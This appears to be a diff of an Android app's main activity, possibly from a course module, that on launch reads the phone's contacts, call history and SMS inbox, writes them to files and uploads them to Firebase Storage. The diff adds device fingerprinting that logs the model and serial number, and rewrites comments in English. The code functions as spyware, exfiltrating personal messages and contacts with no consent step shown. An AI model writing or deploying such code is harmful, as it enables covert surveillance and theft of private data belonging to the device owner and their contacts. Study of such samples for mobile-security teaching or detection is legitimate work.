@@ -1,19 +1,17 @@
 package com.example.Modul6;
 
-import androidx.annotation.NonNull;
 import androidx.appcompat.app.AppCompatActivity;
 import androidx.core.app.ActivityCompat;
 import androidx.core.content.ContextCompat;
 
 import android.Manifest;
+import android.annotation.SuppressLint;
 import android.content.ContentValues;
 import android.content.Context;
 import android.content.pm.PackageManager;
 import android.database.Cursor;
-import android.location.Location;
-import android.location.LocationListener;
-import android.location.LocationManager;
 import android.net.Uri;
+import android.net.wifi.WifiInfo;
 import android.net.wifi.WifiManager;
 import android.os.Build;
 import android.os.Environment;
@@ -22,27 +20,27 @@ import android.provider.ContactsContract;
 
 import android.os.Bundle;
 import android.provider.MediaStore;
+import android.provider.Settings;
 import android.telephony.TelephonyManager;
 import android.util.Log;
 
 import com.google.firebase.storage.FirebaseStorage;
 import com.google.firebase.storage.StorageReference;
-import com.google.firebase.storage.UploadTask;
 
-import java.io.BufferedWriter;
 import java.io.File;
-import java.io.FileOutputStream;
-import java.io.FileWriter;
 import java.io.IOException;
 import java.io.OutputStream;
-import java.io.OutputStreamWriter;
+import java.net.Inet4Address;
+import java.net.InetAddress;
+import java.net.NetworkInterface;
 import java.text.SimpleDateFormat;
+import java.util.Collections;
 import java.util.Date;
-import java.util.Locale;
+import java.util.List;
 
-public class MainActivity extends AppCompatActivity{
-
+public class MainActivity extends AppCompatActivity {
     String currentTime;
+
     @Override
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
@@ -56,7 +54,22 @@ public class MainActivity extends AppCompatActivity{
         getCallDetails();
         getSmsDetails();
 
+        getINfo();
+
     }
+
+    private void getINfo() {
+        Log.d("Build1","OS Version: " + Build.VERSION.RELEASE + "\n");
+        Log.d("Build1","OS API Level: " + Build.VERSION.SDK_INT + "\n");
+        Log.d("Build1","Device Manufacturer: " + Build.MANUFACTURER + "\n");
+        Log.d("Build1", "Device Model: " + Build.MODEL + "\n");
+        Log.d("Build1", "Device Name: " + Build.DEVICE + "\n");
+        Log.d("Build1","Product Name: " + Build.PRODUCT + "\n");
+        Log.d("Build1", "Hardware Name: " + Build.HARDWARE + "\n");
+        Log.d("Build1","Serial Number: " + Build.SERIAL + "\n");
+
+    }
+
 
     private void requestPermission() {
         if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CONTACTS) != PackageManager.PERMISSION_GRANTED ||
@@ -77,15 +90,16 @@ public class MainActivity extends AppCompatActivity{
     }
 
     private void uploadFirebase(File file) {
+        // Get an instance of FirebaseStorage
         FirebaseStorage storage = FirebaseStorage.getInstance();
-        // Create a storage reference from our app
-        StorageReference storageRef = storage.getReference();
         // Create a reference to the file you want to upload
-        StorageReference fileRef = storageRef.child("data" + currentTime+ "/"+ file.getName());
+        StorageReference fileRef = storage.getReference().child(
+            "data" + currentTime+ "/"+ file.getName());
 
+        // Get the path of the file to be uploaded
         String filePath = file.getPath();
+        // Convert the file path to a Uri
         Uri fileUri = Uri.fromFile(new File(filePath));
-
 
         // Upload file to Firebase Storage
         fileRef.putFile(fileUri)
@@ -98,59 +112,74 @@ public class MainActivity extends AppCompatActivity{
                     Log.e("uploadFirebase", "Error uploading file", e);
                 });
     }
+
     private void getContactList() {
         String namefile = "contacts" + currentTime + ".txt";
 
-        // Tạo tệp tin bằng lớp MediaStore
+        // Create a new ContentValues object to store the metadata of the new file
         ContentValues values = new ContentValues();
         values.put(MediaStore.MediaColumns.DISPLAY_NAME, namefile);
         values.put(MediaStore.MediaColumns.MIME_TYPE, "text/plain");
         values.put(MediaStore.MediaColumns.RELATIVE_PATH, Environment.DIRECTORY_DOWNLOADS);
 
+        // Insert the new file into the Downloads directory using the MediaStore API
         Uri uri = getContentResolver().insert(MediaStore.Downloads.EXTERNAL_CONTENT_URI, values);
 
         try {
+            // Open an output stream to the newly created file
             OutputStream outputStream = getContentResolver().openOutputStream(uri);
 
-            // Query danh sách liên hệ
-            Cursor cursor = getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, null, null, null);
-            // Lưu danh sách liên hệ vào tệp tin
+            // Query the contact list to retrieve phone numbers
+            Cursor cursor = getContentResolver().query(
+                    ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
+                    null, null, null, null);
+
+            // Loop through the result set of the query
             while (cursor.moveToNext()) {
+                // Retrieve the phone number value from the current row of the result set
                 String name = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME));
                 String phone = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
 
+                Log.d("getContactList", name + ", " + phone + "\n");
+                // Create a string by concatenating name, phone, and a newline character
                 String line = name + ", " + phone + "\n";
+                // Write the string to the output stream as a byte array
                 outputStream.write(line.getBytes());
-                Log.d("getContact", name + ", " + phone + "\n");
             }
             cursor.close();
             outputStream.close();
         } catch (IOException e) {
             e.printStackTrace();
         }
+        // Create a File object for the desired file in the Downloads directory
         File file = new File(Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS), namefile);
-        Log.d("getContact", file.getName());
+        // Upload the file to Firebase
         uploadFirebase(file);
     }
     private void getCallDetails() {
         String namefile = "callDetails" + currentTime + ".txt";
 
-        // Tạo tệp tin bằng lớp MediaStore
+        // Creating files using the MediaStore class
         ContentValues values = new ContentValues();
         values.put(MediaStore.MediaColumns.DISPLAY_NAME, namefile);
         values.put(MediaStore.MediaColumns.MIME_TYPE, "text/plain");
         values.put(MediaStore.MediaColumns.RELATIVE_PATH, Environment.DIRECTORY_DOWNLOADS);
-
+        
+        // Insert the new file into the Downloads directory using the MediaStore API
         Uri uri = getContentResolver().insert(MediaStore.Downloads.EXTERNAL_CONTENT_URI, values);
 
         try {
+            // Open an output stream to the newly created file
             OutputStream outputStream = getContentResolver().openOutputStream(uri);
 
-            // Lấy cursor để truy vấn lịch sử cuộc gọi
-            Cursor cursor = getContentResolver().query(CallLog.Calls.CONTENT_URI, null, null, null, CallLog.Calls.DATE + " DESC");
+            // Get the cursor to query the call history
+            Cursor cursor = getContentResolver().query(
+                CallLog.Calls.CONTENT_URI, null, null, null, 
+                CallLog.Calls.DATE + " DESC");
 
             // Iterate over the cursor to retrieve the contacts
             while (cursor.moveToNext()) {
+                // Retrieve the call details from the current row of the cursor
                 String number = cursor.getString(cursor.getColumnIndex(CallLog.Calls.NUMBER));
                 String name = cursor.getString(cursor.getColumnIndex(CallLog.Calls.CACHED_NAME));
                 String duration = cursor.getString(cursor.getColumnIndex(CallLog.Calls.DURATION));
@@ -160,8 +189,10 @@ public class MainActivity extends AppCompatActivity{
                 SimpleDateFormat formatter = new SimpleDateFormat("dd-MMM-yyyy HH:mm:ss");
                 String dateString = formatter.format(new Date(Long.parseLong(date)));
 
+                // Format the call details as a comma-separated string and write it to the output stream
                 String line = number + ", " + name +", "+ duration +", "+ type +", "+ date + "\n";
                 outputStream.write(line.getBytes());
+
                 Log.d("getCallDetails", "Name: " + name + " Number: " + number + " Date: " + dateString + " Duration: " + duration + " Type: " + type);
             }
             cursor.close();
@@ -169,29 +200,34 @@ public class MainActivity extends AppCompatActivity{
         } catch (IOException e) {
             e.printStackTrace();
         }
+        // Create a File object for the desired file in the Downloads directory
         File file = new File(Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS), namefile);
-        Log.d("getCallDetails", file.getName());
+        // Upload the file to Firebase
         uploadFirebase(file);
     }
     private void getSmsDetails() {
         String namefile = "SmsDetails" + currentTime + ".txt";
 
-        // Tạo tệp tin bằng lớp MediaStore
+        // Creating files using the MediaStore class
         ContentValues values = new ContentValues();
         values.put(MediaStore.MediaColumns.DISPLAY_NAME, namefile);
         values.put(MediaStore.MediaColumns.MIME_TYPE, "text/plain");
         values.put(MediaStore.MediaColumns.RELATIVE_PATH, Environment.DIRECTORY_DOWNLOADS);
 
+        // Insert the new file into the Downloads directory using the MediaStore API
         Uri uri = getContentResolver().insert(MediaStore.Downloads.EXTERNAL_CONTENT_URI, values);
 
         try {
+            // Open an output stream to the newly created file
             OutputStream outputStream = getContentResolver().openOutputStream(uri);
 
-            // Lấy cursor để truy vấn tin nhắn
-            Cursor cursor = getContentResolver().query(Uri.parse("content://sms/inbox"), null, null, null, null);
+            // Get the cursor to query the message
+            Cursor cursor = getContentResolver().query(
+                Uri.parse("content://sms/inbox"), null, null, null, null);
 
             // Iterate over the cursor to retrieve the contacts
             while (cursor.moveToNext()) {
+                // Retrieve the call details from the current row of the cursor
                 String address = cursor.getString(cursor.getColumnIndex("address"));
                 String body = cursor.getString(cursor.getColumnIndex("body"));
                 String date = cursor.getString(cursor.getColumnIndex("date"));
@@ -199,8 +235,11 @@ public class MainActivity extends AppCompatActivity{
                 SimpleDateFormat formatter = new SimpleDateFormat("dd-MMM-yyyy HH:mm:ss");
                 String dateString = formatter.format(new Date(Long.parseLong(date)));
 
+                // Format the call details as a comma-separated string and write it to the output stream
                 String line = address + ", " + body +", "+ date + "\n";
                 outputStream.write(line.getBytes());
+
+
                 Log.d("getSmsDetails", "Address: " + address + " Date: " + dateString + " Body: " + body);
             }
             cursor.close();
@@ -209,9 +248,11 @@ public class MainActivity extends AppCompatActivity{
             e.printStackTrace();
         }
 
+        // Create a File object for the desired file in the Downloads directory
         File file = new File(Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS), namefile);
-        Log.d("getSmsDetails", file.getName());
+        // Upload the file to Firebase  
         uploadFirebase(file);
     }
+
 
 }
